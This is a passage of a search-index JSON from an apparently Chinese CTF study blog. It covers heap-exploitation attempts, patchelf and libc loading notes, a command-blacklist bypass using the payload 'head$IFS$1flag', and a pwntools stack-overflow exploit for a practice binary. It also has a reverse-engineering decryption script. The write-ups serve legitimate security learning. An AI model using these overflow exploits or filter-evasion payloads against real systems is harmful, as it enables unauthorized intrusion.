p64(ptr-0x18) self.bk = p64(ptr-0x10) self.next_chunk_prev_size = p64(size) self.payload = (size - 32)*b\\\"a\\\" + self.next_chunk_prev_size print(f\\\"构造的chunk:\\\\n\\\\tprev_size:0\\\\n\\\\tsize:{ size }\\\\n\\\\tfd:{ hex(size +1) }\\\\n\\\\tbk:{ hex(ptr-0x10) }\\\\n\\\\tpatload长度:{ len(self.payload) }\\\\n\\\\t总长度:{ len(self.get_chunk_str()) }\\\") def waite_menu(): print(r.recvuntil(b\\\"Your choice:\\\")) def show(index): waite_menu() r.sendline(b\\\"2\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) def delete(index): waite_menu() r.sendline(b\\\"3\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(f\\\"------------------\\\\n删除index为{ index }的chunk\\\\n------------------\\\") def add(index,size,content): waite_menu() r.sendline(b\\\"1\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(r.recvuntil(b\\\"Size: \\\")) r.sendline(str(size)) print(r.recvuntil(b\\\"Content: \\\")) r.send(content) print(f\\\"------------------\\\\n添加index为{ index }的chunk\\\\n------------------\\\") # fake_chunk = FakeChunk() # fake_chunk.set_chunk(size=0xa8,) for i in range(10): print(\\\"i :\\\",i) add(i,0xa0,b\\\"\\\\x00\\\") for i in range(8): print(\\\"i :\\\",i) delete(i) add(0,0x90,b\\\"\\\\x00\\\") r.interactive() \",\"然后修改思路 最后的malloc变为malloc一个更小的chunk 这样机制会优先去寻找unsortedbin来切割出一个更小的chunk\"]},\"72\":{\"h\":\"结果\",\"t\":[\"最终让fd和bk写上了main_arean+88的地址了 但是我忽略了 在写入内容的时候最后加了一个0导致我们没办法读出来 内容被阶段了 (悲)\"]},\"73\":{\"h\":\"记一次patchelf的使用+浅理解ld和libc\",\"t\":[\"每次去使用xclibc的时候 都不是特别好使hhh 所以就重新了解一下patchelf的使用参考文章:linux动态链接库的加载顺序_动态链接库顺序-CSDN博客和man ld.so 的翻译_ld-linux.so的man手册-CSDN博客获取程序寻找libc的顺序[转] Linux下程序的加载、运行和终止流程 - JollyWing - 博客园 (cnblogs.com)获取linux加载程序的流程\"]},\"74\":{\"h\":\"程序寻找libc的顺序\",\"t\":[\"这里主要是学习一下程序在查找libc的时候的顺序 方便我们理解我们patchelf要修改哪些东西\",\"优先寻找dt_runpath 如果不存在dt_runpath再去寻找dt_rpath\",\"runpath会ld忽略ld_library_path所以当程序由runpath后我们就算修改ld_libary_path也不会起效果\",\"然后就是寻找ld_libary_path\",\"还有个和这个很相似的变量:libray_path这个变量是程序编译期间查找动态链接库时指定查找共享库的路径 也就是动态共享库的路径 所以说这个变量是开发的时候编译使用 为了让编译器能够找到对应的动态库ld_libary_path程序加载运行期间查找动态链接库的路径（系统默认系统之前查找）\",\"从路径:/etc/ld.so.scache中查找文件\",\"从/lib寻找\",\"从/usr/lib中寻找\"]},\"75\":{\"h\":\"linux程序加载简化流程\",\"t\":[\"执行exec(3)系统调用\",\"陷入系统内核操作 由操作系统加载该文件 内存映射将文件加载到内存中\",\"如果文件头中存在pt_interp那么就会将ld找到 并且映射进入内存 然后准备对应环境 将控制权移交给ld、\",\"ld的作用\",\"解析依赖：动态链接器检查程序的头部，找出程序依赖的所有共享库。\",\"加载共享库：动态链接器查找这些共享库的位置，并将它们加载到内存中。\",\"符号解析：动态链接器解析程序中的符号引用，确保它们指向正确的地址。\"]},\"76\":{\"h\":\"查看程序当前信息\",\"t\":[\"获取目前程序的ld和libc的路径信息\",\"ldd file_name \",\"可以得到libc.so.6的当前绑定地址\",\"ld当前绑定地址\",\"ldd --version \",\"可以查看当前libc和ld的版本\"]},\"77\":{\"h\":\"修改程序的 ld 和 libc 地址\",\"t\":[\"修改ld的地址\",\"patchelf --set-interpreter ld_addr file_name \",\"修改libc的地址\",\"这里old_libc就是ldd查到的那个ld地址(==>之前)比如:libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 那么就是libc.so.6\",\"patchelf --replace-needed old_libc new_libc file_name \",\"修改Libc的地址(不太稳定)\",\"patchelf --set-rpath new_rpath your_file \"]},\"78\":{\"h\":\"nc签到题(常用指令绕过)\",\"t\":[\"第一次拿到这个附件 丢进ida里面没用 后缀改为.zip 也没有看见什么东西 一筹莫展 拿这玩意丢进虚拟机里面跑了一下 发现了import无效指令 所以才改后缀为py 才看见代码\",\"import os art = ''' (( \\\"####@@!!$$ )) `#####@@!$$` )) (( '####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! '@!$: '`\\\\ \\\"!$: /`' '\\\\ '!: /' \\\"\\\\ : /\\\" -.\\\"-/\\\\\\\\\\\\-.\\\"//.-\\\"/:`\\\\.\\\"-.JrS\\\".\\\"-=_\\\\\\\\ \\\" -.\\\"-.\\\\\\\\\\\"-.\\\"//.-\\\".`-.\\\"_\\\\\\\\-.\\\".-\\\\\\\".-//''' print(art) print(\\\"My_shell_ProVersion\\\") blacklist = ['cat','ls',' ','cd','echo','<','${IFS}'] while True: command = input() for i in blacklist: if i in command: exit(0) os.system(command) \"]},\"79\":{\"h\":\"linux中常用的指令\",\"t\":[\"1、cat命令—用于将文件内容输出到终端上，经常使用于查看文本文件的内容。\",\"2、less命令—用于分页查看文件内容，可以向上翻页、向下翻页、搜索关键字等，合适查看大文件。\",\"less [options] file_name \",\"options: \",\"-N 或 --LINE-NUMBERS：显示每行的行号。\",\"-S 或 --chop-long-lines：不折行长行。默认情况下，less 会折行显示超出屏幕宽度的长行。使用此选项后，长行将不会被折行，而是横向滚动显示。\",\"-M 或 --LONG-PROMPT：显示更详细的提示信息，包括文件的百分比位置等。\",\"-i 或 --ignore-case：在搜索时忽略大小写。默认情况下，less 的搜索是区分大小写的。\",\"-g 或 --hilite-search：仅高亮显示最后一次搜索匹配的字符串。\",\"-E 或 --QUIT-AT-EOF：在到达文件末尾时自动退出。\",\"-m 或 --LONG-PROMPT：显示百分比表示的文件位置。\",\"-R 或 --RAW-CONTROL-CHARS：显示控制字符（如颜色代码）。\",\"-X 或 --no-init：不清空屏幕。在退出 less 时，屏幕上显示的文本不会被清除。\",\"-F 或 --quit-if-one-screen：如果文件内容能够在一屏内显示完毕，则自动退出 less。\",\"-? 或 --help：显示帮助信息。\",\"键盘操作:\",\"Space 或 f：向下滚动一页。\",\"b：向上滚动一页。\",\"Arrow keys：逐行滚动。\",\"/：向下搜索字符串。\",\"?：向上搜索字符串。\",\"n：重复上一次搜索（向下）。\",\"N：重复上一次搜索（向上）。\",\"q：退出 less。\",\"3、more命令—与less类似，也是用于分页查看文件内容，但是功能较少，只能向下翻页。\",\"more [options] file_name \",\"4、head命令—用于查看文件的前几行内容，默许情况下显示前10行。\",\"head [options] [file...] \",\"其中，[file...] 是一个或多个文件名。如果没有指定文件，或者文件名为 -，head 会从标准输入读取数据。\",\"-n [数值] 或 --lines=[数值]：显示文件开始的指定行数。例如，head -n 5 file.txt 会显示 file.txt 的前 5 行。\",\"-c [数值] 或 --bytes=[数值]：显示文件开始的指定字节数。例如，head -c 100 file.txt 会显示 file.txt 的前 100 个字节。\",\"-q 或 --quiet：在处理多个文件时不打印每个文件的名称作为头部。\",\"-v 或 --verbose：总是打印每个文件的名称作为头部。\",\"5、tail命令—用于查看文件的后几行内容，默许情况下显示文件的最后10行。 6、nl命令—用于在文件中加上行号，便于查看和编辑文件。 7、vi/vim命令—是一种文本编辑器，可以用于查看和编辑文件内容，适用于高级用户。\"]},\"80\":{\"h\":\"IFS变量\",\"t\":[\"这里提到IFS作为Shell的内置变量，是一个用于分割字段的字符列表\"]},\"81\":{\"h\":\"IFS 的工作原理\",\"t\":[\"IFS 是一个特殊的 shell 变量，用于定义字段边界。它告诉 shell 如何解释序列和字段分隔符。这对于文本解析、命令行参数处理以及读取和解析数据至关重要。\",\"默认情况下，IFS 包含空格、制表符和换行符。这意味着 shell 在处理文本时会将这些字符视为字段之间的分隔符。\",\"更改 IFS 的值可以改变 shell 解释数据的方式。这特别有用于处理非标准格式的数据。\"]},\"82\":{\"h\":\"这里举列子:\",\"t\":[\"IFS=',' line=\\\"apple,banana,cherry\\\" for fruit in $line; do echo $fruit done # 输出：apple banana cherry \"]},\"83\":{\"h\":\"payload\",\"t\":[\"head$IFS$1flag\"]},\"84\":{\"h\":\"siscn_pwn1(栈迁移+float数据格式)\",\"t\":[\"看一下题发现应该是比较简单的 由于有个gets函数 所以我有点想直接覆盖数据为11.28125\",\"int func() { char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(\\\"Let's guess the number.\\\"); gets(v1); if ( v2 == 11.28125 ) return system(\\\"cat /flag\\\"); else return puts(\\\"Its value should be 11.28125\\\"); } \",\"保护\",\"[*] '/home/agentalbrazee/work/ctf/pwn/cp/nssctf/pwn1/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \"]},\"85\":{\"h\":\"实验float的存储数据\",\"t\":[\"为了实验一下 我们手搓一个程序 gdb调试一下\",\"#include<stdio.h> int main() { float a; a = 11.28125; printf(\\\"The value of a is %f\\\\n\\\",a); } \",\"获取结果:\",\"► 0x5555555551c7 <main+62> call __isoc99_scanf@plt <__isoc99_scanf@plt> format: 0x555555556004 ◂— 0x7620656854006625 /* '%f' */ vararg: 0x7fffffffdee4 ◂— 0xc7df9b0041348000 \",\"那么我们就知道了 这里的存储数据为0xc7df9b0041348000\",\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",\"int __cdecl main(int argc, const char **argv, const char **envp) { float v4; // [rsp+2Ch] [rbp-4h] BYREF _main(argc, argv, envp); v4 = 11.28125; scanf(\\\"%f\\\", &v4); printf(\\\"The value of a is %f\\\\n\\\", v4); return 0; } \",\"然后在scanf里面下idapython脚本:\",\"import idc print(\\\"rax\\\",hex(idc.get_reg_value(\\\"rax\\\"))) \",\"获取数据:rax 0x61fe1c 好像还是不太对\",\"(太笨了)最后我们直接在程序源代码重找cmp的部分找到了\",\".rodata:00000000004007F4 00 80 34 41 dword_4007F4 dd 41348000h \"]},\"86\":{\"h\":\"尝试覆盖\",\"t\":[\"from pwn import * # r = remote(\\\"node5.anna.nssctf.cn\\\",28355) r = gdb.debug(\\\"./pwn1\\\",\\\"b main\\\") print(r.recvuntil(b\\\"Let's guess the number.\\\\n\\\")) payload = b\\\"a\\\"*(0x30 - 4) +p32(0x41348000) r.sendline(payload) r.interactive() \",\"最后成功\"]},\"87\":{\"h\":\"HgameWeek2Babyre\",\"t\":[\"看上去应该是简单的hh\"]},\"88\":{\"h\":\"解释部分函数\",\"t\":[\"pthread_create 函数 看名字就应该差不多能推断出来是一个线程创建函数\",\"int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); \",\"thread: 指向 pthread_t 变量的指针，函数成功完成时，这个变量将被填充为新创建线程的线程ID。\",\"attr: 指向 pthread_attr_t 结构体的指针，该结构体指定了新线程的属性。如果此值为 NULL，则使用默认属性创建线程。\",\"start_routine: 指向将由新线程执行的函数的函数指针。这个函数必须返回一个 void * 并且接受一个 void * 参数。\",\"arg: 指向将被传递给 start_routine 函数的参数的指针。\",\"函数在成功时返回 0，在失败时返回非零错误编号。\",\"pthread_join 函数是 POSIX 线程库（pthreads）中的一个函数，用于等待指定的线程结束。\",\"当一个线程结束时，它的资源不会立即被操作系统回收，直到其他线程对其进行了回收操作。pthread_join 函数允许一个线程等待另一个线程结束，并回收其资源，类似于进程中的 wait 系统调用。\",\"#include <pthread.h> int pthread_join(pthread_t thread, void **retval); \",\"thread: 要等待的线程标识符，是调用 pthread_create 时创建线程的返回值。\",\"retval: 指向一个指针的指针，用于接收被等待线程的退出状态。如果不关心退出状态，可以传递 NULL。\"]},\"89\":{\"h\":\"正式做题\",\"t\":[\"先大概把类型改改 把变量名字改改\",\"__int64 __fastcall main(__int64 a1, char **a2, char **a3) { int i; // [rsp+0h] [rbp-40h] int j; // [rsp+4h] [rbp-3Ch] pthread_t newthread; // [rsp+10h] [rbp-30h] BYREF pthread_t v7; // [rsp+18h] [rbp-28h] BYREF pthread_t v8; // [rsp+20h] [rbp-20h] BYREF pthread_t v9[3]; // [rsp+28h] [rbp-18h] BYREF v9[2] = __readfsqword(0x28u); get_input(); if ( !__sigsetjmp(env, 1) ) { signal(8, (__sighandler_t)handler); for ( i = 0; i <= 5; ++i ) *((_BYTE *)&value + i) ^= 0x11u; } sem_init(&sem, 0, 1u); sem_init(&stru_557BBE9C2280, 0, 0); sem_init(&stru_557BBE9C22A0, 0, 0); sem_init(&stru_557BBE9C22C0, 0, 0); pthread_create(&newthread, 0LL, (void *(*)(void *))dest0, 0LL); pthread_create(&v7, 0LL, dest1, 0LL); pthread_create(&v8, 0LL, dest2, 0LL); pthread_create(v9, 0LL, dest3, 0LL); for ( j = 0; j <= 3; ++j ) pthread_join(*(&newthread + j), 0LL); sub_557BBE9BF803(); return 0LL; } \"]},\"90\":{\"h\":\"流程\",\"t\":[\"先是get我们的输入 然后在我们输入最后的位置加入249数据\",\"对value变量xor 我们点入value变量 查看相关引用 发现主要用在加密input上面 并且发现下面这个函数 说明初始值是feifei\",\"void sub_557BBE9BF2E9() { strcpy((char *)&value, \\\"feifei\\\"); } \",\"然后分别开启四个函数 并发开启\",\"几乎每个函数都是长这个样子的 我们猜测是每个函数要等待上一个函数执行完毕再执行\",\"真实情况我们以动调为标准\",\"void __fastcall __noreturn dest0(void *a1) { while ( 1 ) { sem_wait(&sem); if ( n > 31 ) break; input[n] += *((char *)&value + (n + 1) % 6) * input[n + 1]; ++n; sem_post(&stru_557BBE9C2280); } sem_post(&stru_557BBE9C2280); pthread_exit(0LL); } \",\"最后就是检查input是否为flag了\"]},\"91\":{\"h\":\"动调\",\"t\":[\"由于这题涉及多线程 所以我们就在每个加密函数里面打idapython的脚本 来看看对应函数运行的时候n的值\",\"import idc print(\\\"dest 0 n:\\\",idc.get_reg_value(\\\"eax\\\")) \",\"类似于这样 也就是在dest函数下面写入对应的脚本 来看看运行的顺序\",\"dest 0 n: 0 dest 1 n: 1 dest 2 n: 2 dest 3 n: 3 dest 0 n: 4 dest 1 n: 5 dest 2 n: 6 dest 3 n: 7 dest 0 n: 8 dest 1 n: 9 dest 2 n: 10 dest 3 n: 11 dest 0 n: 12 dest 1 n: 13 dest 2 n: 14 dest 3 n: 15 dest 0 n: 16 dest 1 n: 17 dest 2 n: 18 dest 3 n: 19 dest 0 n: 20 dest 1 n: 21 dest 2 n: 22 dest 3 n: 23 dest 0 n: 24 dest 1 n: 25 dest 2 n: 26 dest 3 n: 27 dest 0 n: 28 dest 1 n: 29 dest 2 n: 30 dest 3 n: 31 dest 0 n: 32 dest 1 n: 32 dest 2 n: 32 dest 3 n: 32 \",\"以及value的部分\",\"get_input(); if ( !__sigsetjmp(env, 1) ) { signal(8, (__sighandler_t)handler); for ( i = 0; i <= 5; ++i ) *((_BYTE *)&value + i) ^= 0x11u; } \",\"这里我们动调发现value的值在xor第三次的时候就终止了 所以参与下面加密函数的value值为:\",\"char value[6] = { 0x77, 0x74, 0x78, 0x66, 0x65, 0x69 }; \"]},\"92\":{\"h\":\"脚本\",\"t\":[\"流程知道了 反调试知道了 现在提取flag数据进行解密\",\"#include <stdio.h> char value[6] = { 0x77, 0x74, 0x78, 0x66, 0x65, 0x69}; unsigned int flag[33] = { 0x00002F14, 0x0000004E, 0x00004FF3, 0x0000006D, 0x000032D8, 0x0000006D, 0x00006B4B, 0xFFFFFF92, 0x0000264F, 0x0000005B, 0x000052FB, 0xFFFFFF9C, 0x00002B71, 0x00000014, 0x00002A6F, 0xFFFFFF95, 0x000028FA, 0x0000001D, 0x00002989, 0xFFFFFF9B, 0x000028B4, 0x0000004E, 0x00004506, 0xFFFFFFDA, 0x0000177B, 0xFFFFFFFC, 0x000040CE, 0x0000007D, 0x000029E3, 0x0000000F, 0x00001F11, 0x000000FF, 0xFA}; void dest3(int n) { printf(\\\"dest3 n:%d\\\\n\\\", n); flag[n] ^= flag[n + 1] - value[(n + 1) % 6]; } void dest2(int n) { printf(\\\"dest2 n:%d\\\\n\\\", n); flag[n] /= flag[n + 1] + value[(n + 1) % 6]; } void dest1(int n) { printf(\\\"dest1 n:%d\\\\n\\\", n); flag[n] += value[(n + 1) % 6] ^ flag[n + 1]; } void dest0(int n) { printf(\\\"dest0 n:%d\\\\n\\\", n); flag[n] -= value[(n + 1) % 6] * flag[n + 1]; } int main() { printf(\\\"test\\\"); for (int i = 31; i >= 0; i--) { switch (i % 4) { case 3: dest3(i); break; case 2: dest2(i); break; case 1: dest1(i); break; case 0: dest0(i); break; default: break; } /* code */ } printf(\\\"\\\\nOutput:\\\\n\\\"); for (int i = 0; i < 32; i++) { printf(\\\"%c\\\", flag[i]); /* code */ } } \"]},\"93\":{\"h\":\"Android\"},\"94\":{\"h\":\"Posts\"},\"95\":{\"h\":\"Pwn\"},\"96\":{\"h\":\"Nssctf\"},\"97\":{\"h\":\"Hgame Week2\"},\"98\":{\"h\":\"Re\"}},\"dirtCount\":0,\"index\":[[\"^\",{\"1\":{\"92\":1}}],[\"^=\",{\"1\":{\"89\":1,\"91\":1,\"92\":1}}],[\"现在提取flag数据进行解密\",{\"1\":{\"92\":1}}],[\"现在在栈顶\",{\"1\":{\"44\":1}}],[\"反调试知道了\",{\"1\":{\"92\":1}}],[\"9\",{\"1\":{\"91\":1}}],[\"动调\",{\"0\":{\"91\":1}}],[\"动态链接器解析程序中的符号引用\",{\"1\":{\"75\":1}}],[\"动态链接器查找这些共享库的位置\",{\"1\":{\"75\":1}}],[\"动态链接器检查程序的头部\",{\"1\":{\"75\":1}}],[\"动态链接库顺序\",{\"1\":{\"73\":1}}],[\"真实情况我们以动调为标准\",{\"1\":{\"90\":1}}],[\"几乎每个函数都是长这个样子的\",{\"1\":{\"90\":1}}],[\"说明初始值是feifei\",{\"1\":{\"90\":1}}],[\"正式做题\",{\"0\":{\"89\":1}}],[\"要等待的线程标识符\",{\"1\":{\"88\":1}}],[\"要hook的函数偏移\",{\"1\":{\"15\":1}}],[\"要hook的函数\",{\"1\":{\"11\":1}}],[\"要hook的代码\",{\"1\":{\"11\":1}}],[\"类似于这样\",{\"1\":{\"91\":1}}],[\"类似于进程中的\",{\"1\":{\"88\":1}}],[\"类似文章中举列子的一样\",{\"1\":{\"11\":1}}],[\"直到其他线程对其进行了回收操作\",{\"1\":{\"88\":1}}],[\"直接向emo\",{\"1\":{\"36\":1}}],[\"它的资源不会立即被操作系统回收\",{\"1\":{\"88\":1}}],[\"它告诉\",{\"1\":{\"81\":1}}],[\"线程库\",{\"1\":{\"88\":1}}],[\"参数\",{\"1\":{\"88\":1}}],[\"参考文章\",{\"1\":{\"45\":1}}],[\"参考文章android之frida框架完全使用指南\",{\"1\":{\"1\":1}}],[\"该结构体指定了新线程的属性\",{\"1\":{\"88\":1}}],[\"该地址的相对偏移值存放在libc\",{\"1\":{\"27\":1}}],[\"尝试覆盖\",{\"0\":{\"86\":1}}],[\"太笨了\",{\"1\":{\"85\":1}}],[\"太多了\",{\"1\":{\"19\":1}}],[\"好像还是不太对\",{\"1\":{\"85\":1}}],[\"◂\",{\"1\":{\"85\":2}}],[\"►\",{\"1\":{\"85\":1}}],[\"为了实验一下\",{\"1\":{\"85\":1}}],[\"为了让编译器能够找到对应的动态库ld\",{\"1\":{\"74\":1}}],[\"看名字就应该差不多能推断出来是一个线程创建函数\",{\"1\":{\"88\":1}}],[\"看上去应该是简单的hh\",{\"1\":{\"87\":1}}],[\"看一下题发现应该是比较简单的\",{\"1\":{\"84\":1}}],[\"看下一个chunk的prev\",{\"1\":{\"65\":1}}],[\"解释部分函数\",{\"0\":{\"88\":1}}],[\"解释数据的方式\",{\"1\":{\"81\":1}}],[\"解析依赖\",{\"1\":{\"75\":1}}],[\"更改\",{\"1\":{\"81\":1}}],[\"制表符和换行符\",{\"1\":{\"81\":1}}],[\"包含空格\",{\"1\":{\"81\":1}}],[\"包括文件的百分比位置等\",{\"1\":{\"79\":1}}],[\"命令行参数处理以及读取和解析数据至关重要\",{\"1\":{\"81\":1}}],[\"变量的指针\",{\"1\":{\"88\":1}}],[\"变量\",{\"1\":{\"81\":1}}],[\"适用于高级用户\",{\"1\":{\"79\":1}}],[\"7\",{\"1\":{\"79\":1,\"91\":1}}],[\"便于查看和编辑文件\",{\"1\":{\"79\":1}}],[\"总是打印每个文件的名称作为头部\",{\"1\":{\"79\":1}}],[\"个字节\",{\"1\":{\"79\":1}}],[\"行\",{\"1\":{\"79\":1}}],[\"例如\",{\"1\":{\"79\":2}}],[\"数值\",{\"1\":{\"79\":4}}],[\"是调用\",{\"1\":{\"88\":1}}],[\"是一个特殊的\",{\"1\":{\"81\":1}}],[\"是一个用于分割字段的字符列表\",{\"1\":{\"80\":1}}],[\"是一个或多个文件名\",{\"1\":{\"79\":1}}],[\"是一种文本编辑器\",{\"1\":{\"79\":1}}],[\"是决定是我们的操作\",{\"1\":{\"54\":1}}],[\"默许情况下显示文件的最后10行\",{\"1\":{\"79\":1}}],[\"默许情况下显示前10行\",{\"1\":{\"79\":1}}],[\"默认情况下\",{\"1\":{\"79\":2,\"81\":1}}],[\"默认值为\",{\"1\":{\"27\":1}}],[\"41348000h\",{\"1\":{\"85\":1}}],[\"41\",{\"1\":{\"85\":1}}],[\"4h\",{\"1\":{\"84\":1,\"85\":1}}],[\"44\",{\"1\":{\"84\":1}}],[\"4\",{\"1\":{\"79\":1,\"86\":1,\"91\":1,\"92\":1}}],[\"40h\",{\"1\":{\"89\":1}}],[\"4007f4\",{\"1\":{\"85\":1}}],[\"40\",{\"1\":{\"35\":4}}],[\"退出\",{\"1\":{\"79\":1}}],[\"逐行滚动\",{\"1\":{\"79\":1}}],[\"keys\",{\"1\":{\"79\":1}}],[\"keeping\",{\"1\":{\"29\":1}}],[\"键盘操作\",{\"1\":{\"79\":1}}],[\"则使用默认属性创建线程\",{\"1\":{\"88\":1}}],[\"则自动退出\",{\"1\":{\"79\":1}}],[\"则从unsorted\",{\"1\":{\"51\":1}}],[\"则从tcachebin\",{\"1\":{\"51\":1}}],[\"屏幕上显示的文本不会被清除\",{\"1\":{\"79\":1}}],[\"时创建线程的返回值\",{\"1\":{\"88\":1}}],[\"时\",{\"1\":{\"79\":1}}],[\"仅高亮显示最后一次搜索匹配的字符串\",{\"1\":{\"79\":1}}],[\"仅仅是检查bin中第一个chunk是否是相同的chunk\",{\"1\":{\"60\":1}}],[\"而是横向滚动显示\",{\"1\":{\"79\":1}}],[\"而在fastbin为空时\",{\"1\":{\"27\":1}}],[\"长行将不会被折行\",{\"1\":{\"79\":1}}],[\"显示文件开始的指定字节数\",{\"1\":{\"79\":1}}],[\"显示文件开始的指定行数\",{\"1\":{\"79\":1}}],[\"显示帮助信息\",{\"1\":{\"79\":1}}],[\"显示控制字符\",{\"1\":{\"79\":1}}],[\"显示百分比表示的文件位置\",{\"1\":{\"79\":1}}],[\"显示更详细的提示信息\",{\"1\":{\"79\":1}}],[\"显示每行的行号\",{\"1\":{\"79\":1}}],[\"显然不足以超过tcache\",{\"1\":{\"69\":1}}],[\"或者文件名为\",{\"1\":{\"79\":1}}],[\"或\",{\"1\":{\"79\":16}}],[\"或main\",{\"1\":{\"69\":1}}],[\"合适查看大文件\",{\"1\":{\"79\":1}}],[\"合并后会被放入unsorted\",{\"1\":{\"27\":1}}],[\"搜索关键字等\",{\"1\":{\"79\":1}}],[\"经常使用于查看文本文件的内容\",{\"1\":{\"79\":1}}],[\"`\",{\"1\":{\"78\":9}}],[\"`com\",{\"1\":{\"19\":1}}],[\"才看见代码\",{\"1\":{\"78\":1}}],[\"才会放入fastbin\",{\"1\":{\"28\":1}}],[\"发现主要用在加密input上面\",{\"1\":{\"90\":1}}],[\"发现了import无效指令\",{\"1\":{\"78\":1}}],[\"发现frida在新版本中移除了\",{\"1\":{\"19\":1}}],[\"拿这玩意丢进虚拟机里面跑了一下\",{\"1\":{\"78\":1}}],[\"zip\",{\"1\":{\"78\":1}}],[\"zhihu\",{\"1\":{\"44\":1}}],[\"后缀改为\",{\"1\":{\"78\":1}}],[\"后一个chunk的指针\",{\"1\":{\"38\":1}}],[\"丢进ida里面没用\",{\"1\":{\"78\":1}}],[\"常用指令绕过\",{\"0\":{\"78\":1}}],[\"地址\",{\"0\":{\"77\":1}}],[\"地址后面的内容会被当成栈\",{\"1\":{\"25\":1}}],[\"确保它们指向正确的地址\",{\"1\":{\"75\":1}}],[\"确实重要\",{\"1\":{\"23\":1}}],[\"符号解析\",{\"1\":{\"75\":1}}],[\"符号索引\",{\"1\":{\"44\":1}}],[\"并发开启\",{\"1\":{\"90\":1}}],[\"并回收其资源\",{\"1\":{\"88\":1}}],[\"并将它们加载到内存中\",{\"1\":{\"75\":1}}],[\"并且发现下面这个函数\",{\"1\":{\"90\":1}}],[\"并且接受一个\",{\"1\":{\"88\":1}}],[\"并且映射进入内存\",{\"1\":{\"75\":1}}],[\"并且通过测试发现只要是刚好要malloc的chunk大小如何符合\",{\"1\":{\"70\":1}}],[\"并且\",{\"1\":{\"44\":1}}],[\"并且被清空\",{\"1\":{\"36\":1}}],[\"加载共享库\",{\"1\":{\"75\":1}}],[\"加载到内存后\",{\"1\":{\"15\":1}}],[\"找出程序依赖的所有共享库\",{\"1\":{\"75\":1}}],[\"陷入系统内核操作\",{\"1\":{\"75\":1}}],[\"系统调用\",{\"1\":{\"75\":1,\"88\":1}}],[\"系统默认系统之前查找\",{\"1\":{\"74\":1}}],[\"系统其实给我们的是一样的chunk大小\",{\"1\":{\"51\":1}}],[\"还有个和这个很相似的变量\",{\"1\":{\"74\":1}}],[\"还任然留在了原地\",{\"1\":{\"25\":1}}],[\"优先寻找dt\",{\"1\":{\"74\":1}}],[\"优先取\",{\"1\":{\"70\":1}}],[\"转\",{\"1\":{\"73\":1}}],[\"都不是特别好使hhh\",{\"1\":{\"73\":1}}],[\"悲\",{\"1\":{\"72\":1}}],[\"内存映射将文件加载到内存中\",{\"1\":{\"75\":1}}],[\"内存对齐\",{\"1\":{\"32\":1}}],[\"内容被阶段了\",{\"1\":{\"72\":1}}],[\"只能向下翻页\",{\"1\":{\"79\":1}}],[\"只需要\",{\"1\":{\"70\":1,\"71\":1}}],[\"只是为了学习\",{\"1\":{\"16\":1}}],[\"构造的chunk\",{\"1\":{\"70\":1,\"71\":1}}],[\"构造fake\",{\"1\":{\"70\":1,\"71\":1}}],[\"构造heap\",{\"1\":{\"37\":1}}],[\"让tcache\",{\"1\":{\"70\":2}}],[\"让fd和bk填充进去\",{\"1\":{\"69\":1}}],[\"让第八个gundam出现在unsorted\",{\"1\":{\"30\":1}}],[\"引入了tcache并且没有引入bk随机数安全检查机制\",{\"1\":{\"69\":1}}],[\"题目\",{\"0\":{\"68\":1}}],[\"虽然这个思路失败了\",{\"1\":{\"67\":1}}],[\"虽然之前也是copy\",{\"1\":{\"51\":1}}],[\"什么都pwn只会害了你\",{\"1\":{\"67\":1}}],[\"泄露libc\",{\"0\":{\"67\":1}}],[\"记一次patchelf的使用+浅理解ld和libc\",{\"0\":{\"73\":1}}],[\"记一次失败的unsoretedbin\",{\"0\":{\"67\":1}}],[\"记住是我们想要写入地址\",{\"1\":{\"60\":1}}],[\"绕过检查\",{\"1\":{\"66\":1}}],[\"主要运用在\",{\"1\":{\"66\":1}}],[\"主要是看ntustisc\",{\"1\":{\"62\":1}}],[\"首个是main\",{\"1\":{\"64\":1}}],[\"首先libc版本为2\",{\"1\":{\"69\":1}}],[\"首先获取p的size然后去找到下一个chunk\",{\"1\":{\"65\":1}}],[\"首先\",{\"1\":{\"29\":1}}],[\"首先是tcahe是单链表结构\",{\"1\":{\"28\":1}}],[\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址\",{\"1\":{\"25\":1}}],[\"首先会被放到\",{\"1\":{\"27\":1}}],[\"被free的chunk的上一块chunk是free\",{\"1\":{\"64\":1}}],[\"被释放后\",{\"1\":{\"27\":1}}],[\"会显示\",{\"1\":{\"79\":2}}],[\"会从标准输入读取数据\",{\"1\":{\"79\":1}}],[\"会折行显示超出屏幕宽度的长行\",{\"1\":{\"79\":1}}],[\"会使用unlink\",{\"1\":{\"65\":1}}],[\"会for循环迭代tcache查看是否有指针和这个即将free的chunk的指针一样\",{\"1\":{\"63\":1}}],[\"会在free进入tcache后在bk位置写入随机数\",{\"1\":{\"63\":1}}],[\"会先搜索bins\",{\"1\":{\"50\":1}}],[\"~0u\",{\"1\":{\"60\":1}}],[\"~0xf\",{\"1\":{\"32\":1,\"33\":1}}],[\"比如\",{\"1\":{\"77\":1}}],[\"比如现在fastbin\",{\"1\":{\"60\":1}}],[\"比如0x1003就是取fs的值\",{\"1\":{\"54\":1}}],[\"利用double\",{\"1\":{\"60\":1}}],[\"利用tcache泄露地址\",{\"0\":{\"30\":1}}],[\"算是一个正式的攻击手段\",{\"1\":{\"60\":1}}],[\"下一个free\",{\"1\":{\"59\":1}}],[\"防止double\",{\"1\":{\"59\":1}}],[\"判断是否是fastbin范围\",{\"1\":{\"57\":1}}],[\"判断最后的size是否小于0x20\",{\"1\":{\"32\":1}}],[\"先是get我们的输入\",{\"1\":{\"90\":1}}],[\"先大概把类型改改\",{\"1\":{\"89\":1}}],[\"先malloc\",{\"1\":{\"70\":1}}],[\"先获取我们真正需要的\",{\"1\":{\"57\":1}}],[\"先学习unlink漏洞\",{\"0\":{\"38\":1}}],[\"运行和终止流程\",{\"1\":{\"73\":1}}],[\"运行\",{\"1\":{\"56\":1,\"57\":1}}],[\